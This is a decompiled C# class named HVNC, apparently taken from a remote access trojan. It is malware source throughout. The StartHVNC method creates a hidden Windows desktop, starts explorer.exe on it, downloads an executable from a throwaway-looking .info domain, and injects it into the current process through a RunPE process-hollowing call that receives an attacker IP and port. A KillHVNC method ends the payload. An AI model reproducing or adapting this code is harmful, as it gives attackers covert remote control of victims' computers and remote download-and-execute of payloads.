using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000019 RID: 25
[StandardModule]
internal sealed class HVNC
{
	// Token: 0x060000E5 RID: 229
	[DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "CreateDesktopW", SetLastError = true)]
	public static extern IntPtr CreateDesktop(string desktopName, IntPtr device, IntPtr deviceMode, uint flags, uint accessMask, HVNC.SECURITY_ATTRIBUTES attributes);

	// Token: 0x060000E6 RID: 230 RVA: 0x00010928 File Offset: 0x0000EB28
	public static void StartHVNC(string ipport)
	{
		if (!HVNC.Running)
		{
			HVNC.SA.bInheritHandle = -1;
			HVNC.SA.lpSecurityDescriptor = (IntPtr)0L;
			HVNC.hNewDesktop = HVNC.CreateDesktop("RemoteDesktop", (IntPtr)0L, (IntPtr)0L, 1u, 511u, HVNC.SA);
			RunPE.PROCESS_INFORMATION process_INFORMATION = default(RunPE.PROCESS_INFORMATION);
			RunPE.STARTUP_INFORMATION startup_INFORMATION = default(RunPE.STARTUP_INFORMATION);
			startup_INFORMATION.cb = Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION));
			startup_INFORMATION.lpDesktop = "RemoteDesktop";
			string lpApplicationName = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "Windows\\explorer.exe";
			string lpCommandLine = null;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES2;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES = security_ATTRIBUTES2;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES3 = security_ATTRIBUTES2;
			RunPE.CreateProcess(lpApplicationName, lpCommandLine, ref security_ATTRIBUTES, ref security_ATTRIBUTES3, false, 0u, IntPtr.Zero, null, ref startup_INFORMATION, out process_INFORMATION);
			WebClient webClient = new WebClient();
			byte[] data;
			if (Environment.Version.Major == 2)
			{
				data = webClient.DownloadData("http://fuehaoisdfhjaefouiads.info/HVNC20.exe");
			}
			if (Environment.Version.Major == 4)
			{
				data = webClient.DownloadData("http://fuehaoisdfhjaefouiads.info/HVNC40.exe");
			}
			RunPE.TryRun(Process.GetCurrentProcess().MainModule.FileName, ipport, data, true, true, "RemoteDesktop", ref HVNC.PID);
			HVNC.Running = true;
		}
	}

	// Token: 0x060000E7 RID: 231 RVA: 0x00010A50 File Offset: 0x0000EC50
	public static void KillHVNC()
	{
		try
		{
			Process.GetProcessById(HVNC.PID).Kill();
			HVNC.Running = false;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0400004A RID: 74
	private const uint CCHDEVICENAME = 32u;

	// Token: 0x0400004B RID: 75
	private const uint CCHFORMNAME = 32u;

	// Token: 0x0400004C RID: 76
	private const uint DF_ALLOWOTHERACCOUNTHOOK = 1u;

	// Token: 0x0400004D RID: 77
	private const uint DESKTOP_CREATEMENU = 4u;

	// Token: 0x0400004E RID: 78
	private const uint DESKTOP_CREATEWINDOW = 2u;

	// Token: 0x0400004F RID: 79
	private const uint DESKTOP_ENUMERATE = 64u;

	// Token: 0x04000050 RID: 80
	private const uint DESKTOP_HOOKCONTROL = 8u;

	// Token: 0x04000051 RID: 81
	private const uint DESKTOP_JOURNALPLAYBACK = 32u;

	// Token: 0x04000052 RID: 82
	private const uint DESKTOP_JOURNALRECORD = 16u;

	// Token: 0x04000053 RID: 83
	private const uint DESKTOP_READOBJECTS = 1u;

	// Token: 0x04000054 RID: 84
	private const uint DESKTOP_SWITCHDESKTOP = 256u;

	// Token: 0x04000055 RID: 85
	private const uint DESKTOP_WRITEOBJECTS = 128u;

	// Token: 0x04000056 RID: 86
	private static bool Running = false;

	// Token: 0x04000057 RID: 87
	private static IntPtr hNewDesktop;

	// Token: 0x04000058 RID: 88
	private static HVNC.SECURITY_ATTRIBUTES SA;

	// Token: 0x04000059 RID: 89
	public static int PID;

	// Token: 0x0200002D RID: 45
	public struct SECURITY_ATTRIBUTES
	{
		// Token: 0x040000B1 RID: 177
		public int nLength;

		// Token: 0x040000B2 RID: 178
		public IntPtr lpSecurityDescriptor;

		// Token: 0x040000B3 RID: 179
		public int bInheritHandle;
	}
}
